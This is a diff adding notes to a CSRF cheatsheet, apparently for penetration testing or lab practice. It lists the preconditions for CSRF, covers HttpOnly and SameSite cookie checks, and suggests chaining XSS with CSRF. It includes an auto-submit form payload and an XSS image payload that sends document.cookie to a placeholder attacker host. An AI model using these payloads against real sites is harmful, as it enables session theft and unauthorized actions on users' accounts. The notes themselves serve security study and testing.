@@ -1,6 +1,23 @@
 # CSRF Cheatsheet
 
-Quick-reference / test checklist. Assumes you already know the theory (see 21.1–21.4 notes).
+## Note
+
+In order for a CSRF attack to be possible:
+> - A relevant action (like change a user email)
+> - Cookie-based session handling (session cookie)
+> - No unpredictable request parameter (no csrf token, or predictable token)
+
+- When `HttpOnly` is `on` (check on inspect storage), the cookie cannot be accessed by JavaScript, helping protect it from XSS attacks. When `HttpOnly` is `off`, the cookie can be accessed by JavaScript, making it more vulnerable to XSS attacks.
+- Also, checking through first few requests for `Samesite Restriction`. SameSite restricts when cookies are sent in cross-site requests, reducing the risk of CSRF attacks.
+- Lastly, consider chaining XSS and CSRF. And try to guess the csrf token/or key if possible (not alway work, so do not waste too much time).
+
+```
+<script>document.forms[0].submit();</script>
+```
+
+```
+<img src=x onerror="location='http://IP:PORT/cookiehandler.php?c='+document.cookie">
+```
 
 ---
 
